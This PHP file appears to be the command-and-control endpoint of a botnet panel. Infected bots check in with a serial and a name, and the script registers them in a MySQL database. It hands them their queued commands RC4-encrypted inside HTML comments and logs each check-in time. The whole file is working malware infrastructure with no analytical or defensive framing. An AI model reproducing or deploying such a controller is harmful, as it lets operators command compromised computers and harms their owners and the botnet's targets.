<?php
//error_reporting(E_ALL);
include("config.php");
include("func.php");
include("rc4.php");
$serial=$_GET['serial'];
$name=$_GET['name'];
$conn=mysql_connect($server,$user,$dbpwd) or die('can´t connect');
$db=mysql_select_db($dbname)or die('wrong db');
$b00l=IsBotInDB($serial,$name);

if ($b00l==0)
{    
   $id=GetBotID($serial,$name);
    if(isset($_GET['meta'])){
         $b00l=SetBotCommand("id=".$id."",
           "wait  ");
           }
   
   $cm=GetBotCmd($id);
   echo '<!--';
   echo RC4($cryptkey,$cm);
   echo '-->';
   echo '!wait';
   SetLoginDate($id);
}
elseif ($b00l!=0)
   {
   AddBotToDB($serial,$name);
  echo '<!--'.RC4($cryptkey,"wait  ")."-->";
    } 
?>
